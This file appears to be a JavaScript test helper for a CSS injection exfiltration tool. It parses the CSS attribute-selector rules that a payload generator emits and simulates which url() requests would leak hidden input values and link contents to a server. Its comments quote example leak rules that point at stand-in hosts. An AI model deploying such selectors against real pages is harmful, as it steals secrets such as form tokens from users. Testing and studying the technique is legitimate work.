'use strict';

const { generateCSS, ANCHOR_LENGTH, ruleCount } = require('../public/payload');

// Seeded PRNG so random runs are reproducible. Override with FRAG_SEED=<n>.
const SEED = process.env.FRAG_SEED ? Number(process.env.FRAG_SEED) : 0xf7a9;

function rng(seed = SEED) {
  let a = seed >>> 0;
  const next = () => {
    a = (a + 0x6d2b79f5) >>> 0;
    let t = a;
    t = Math.imul(t ^ (t >>> 15), t | 1);
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
  next.int = (min, max) => min + Math.floor(next() * (max - min + 1));
  next.chars = (alphabet, n) => Array.from({ length: n }, () => alphabet[Math.floor(next() * alphabet.length)]).join('');
  next.hex = n => next.chars('0123456789abcdef', n);
  next.pick = arr => arr[Math.floor(next() * arr.length)];
  next.shuffle = arr => {
    const a = [...arr];
    for (let i = a.length - 1; i > 0; i--) {
      const j = Math.floor(next() * (i + 1));
      [a[i], a[j]] = [a[j], a[i]];
    }
    return a;
  };
  return next;
}

function grams(s, k) {
  const out = new Set();
  for (let i = 0; i + k <= s.length; i++) out.add(s.substring(i, i + k));
  return out;
}

// Parse the rules generateCSS() emits, e.g.
//   &[href*=abc]{--a:url(http://x/abc),}             anchor
//   &[value^=ab]+*{--s-:url(http://x/s/ab),}         hidden input, sibling host
//   html:has(&[value*=abcd]){--a:url(http://x/abcd),} hidden input, :has() host
//   &[href*=abc i]{--a:url(http://x/abc),}           non-hex: case-insensitive
//   &[href*="0/"i]{--a:url(http://x/0%2F),}           ...with "/" sent as %2F
//   &[href*=aB]{--b:url(http://x/c/aB),}             non-hex: case pair
// Every form keeps the `&` nesting anchor (`html:has(&[...])` too), so it still
// pins the match to an emitted rule. The matching attribute test is the last
// one before the rule body, so it is followed by nothing (anchor), `+*`
// (sibling), or `)` (the :has() close).
function parsePayload(css) {
  const re = /&\[([\w-]+)([\^*$]?=)(?:"((?:[^"\\]|\\.)*)"(i)?|((?:[\w-]|\\[^\n\r\f])+)( i)?)\](?:\+\*|\))?\{--([\w-]+):url\([^)]*?\/(?:([sec])\/)?([\w+=%-]+)\),\}/g;
  const rules = [];
  for (const [, attr, op, quoted, qi, bare, bi, prop, type, chunk] of css.matchAll(re)) {
    const value = (bare ?? quoted).replace(/\\(?:([\da-fA-F]{1,6})[\t\n\f\r ]?|([^\n\r\f]))/g,
      (_, hex, c) => hex ? String.fromCodePoint(parseInt(hex, 16)) : c);
    rules.push({ index: rules.length, attr, op, value, ci: Boolean(qi || bi), prop,
      t: type || 'm', c: decodeURIComponent(chunk) });
  }
  return rules;
}

// What the browser would request for an element whose attribute holds
// `attrValue`: every custom property takes the value of the last matching rule
// (all rules share the same specificity), and each property set to a url()
// becomes one background-image request. Case-insensitive rules are matched
// against the lowercased value (the payload's values are already lowercase).
function leak(rules, attrValue) {
  if (!rules.byNeedle) {
    rules.byNeedle = new Map();
    rules.lengths = new Set();
    for (const r of rules) {
      const key = (r.ci ? 'i' : '') + r.op + (r.ci ? r.value.toLowerCase() : r.value);
      if (!rules.byNeedle.has(key)) rules.byNeedle.set(key, []);
      rules.byNeedle.get(key).push(r);
      rules.lengths.add(r.value.length);
    }
  }
  const matched = [];
  const add = key => matched.push(...(rules.byNeedle.get(key) || []));
  const lower = attrValue.toLowerCase();
  for (const n of rules.lengths) {
    // Case-sensitive keys against the value, case-insensitive ones lowercased.
    for (const [prefix, v] of [['', attrValue], ['i', lower]]) {
      add(prefix + '^=' + v.slice(0, n));
      add(prefix + '$=' + v.slice(-n));
      for (const s of grams(v, n)) add(prefix + '*=' + s);
    }
  }
  const winners = new Map();
  for (const r of [...new Set(matched)].sort((a, b) => a.index - b.index)) winners.set(r.prop, r);
  const requests = [...winners.values()].map(r => ({ t: r.t, c: r.c }));
  return {
    requests,
    data: {
      start: requests.find(r => r.t === 's')?.c ?? null,
      end: requests.find(r => r.t === 'e')?.c ?? null,
      chunks: requests.filter(r => r.t === 'm').map(r => r.c),
      pairs: requests.filter(r => r.t === 'c').map(r => r.c),
    },
  };
}

function payloadRules(config, server = 'http://frag.test') {
  const rules = parsePayload(generateCSS(config, server));
  const expected = ruleCount(config);
  if (rules.length !== expected) throw new Error(`expected ${expected} rules, parsed ${rules.length}`);
  return rules;
}

module.exports = { SEED, ANCHOR_LENGTH, rng, grams, parsePayload, leak, payloadRules };
